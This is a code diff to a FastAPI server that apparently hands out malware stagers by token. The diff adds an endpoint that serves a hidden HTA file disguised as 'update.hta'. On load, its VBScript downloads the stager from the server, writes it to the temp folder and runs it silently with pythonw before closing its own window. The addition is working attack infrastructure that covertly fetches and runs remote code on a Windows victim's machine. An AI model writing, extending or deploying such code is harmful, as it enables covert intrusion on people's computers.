@@ -4,7 +4,8 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
 
 from datetime import datetime, timezone, timedelta
 from fastapi import APIRouter, Depends, HTTPException
-from fastapi.responses import PlainTextResponse
+from fastapi.responses import PlainTextResponse, HTMLResponse
+from fastapi.requests import Request
 from sqlalchemy.orm import Session
 from pydantic import BaseModel
 from typing import Optional
@@ -108,3 +109,53 @@ def serve_stager(token: str, db: Session = Depends(get_db)):
     st.used_count += 1
     db.commit()
     return PlainTextResponse(content=st.code)
+
+
+@router.get("/s/{token}/hta")
+def serve_stager_hta(token: str, request: Request, db: Session = Depends(get_db)):
+    """Serve an HTA wrapper that downloads and runs the stager via pythonw (Windows)."""
+    st = db.query(StagerToken).filter(StagerToken.token == token).first()
+    if not st:
+        raise HTTPException(status_code=404)
+
+    now = datetime.now(timezone.utc)
+    exp = st.expires_at
+    if exp:
+        if exp.tzinfo is None:
+            exp = exp.replace(tzinfo=timezone.utc)
+        if now > exp:
+            raise HTTPException(status_code=410, detail="Expired")
+
+    if st.max_uses > 0 and st.used_count >= st.max_uses:
+        raise HTTPException(status_code=410, detail="Max uses reached")
+
+    # Build the stager code URL from the incoming request's base URL
+    base = str(request.base_url).rstrip("/")
+    stager_url = f"{base}/s/{token}"
+
+    hta = f"""<html>
+<head>
+<hta:application id="app" windowState="minimize" showInTaskbar="no" border="none" caption="no" />
+<script language="VBScript">
+Sub Window_OnLoad
+  Dim h, fso, tmp, ts, sh
+  Set h   = CreateObject("MSXML2.XMLHTTP")
+  h.Open "GET", "{stager_url}", False
+  h.Send
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  tmp     = fso.GetSpecialFolder(2) & "\\s.py"
+  Set ts  = fso.CreateTextFile(tmp, True)
+  ts.Write h.ResponseText
+  ts.Close
+  Set sh  = CreateObject("WScript.Shell")
+  sh.Run "pythonw " & tmp, 0, False
+  window.close()
+End Sub
+</script>
+</head>
+<body></body>
+</html>"""
+    return HTMLResponse(
+        content=hta,
+        headers={"Content-Disposition": "attachment; filename=update.hta"},
+    )
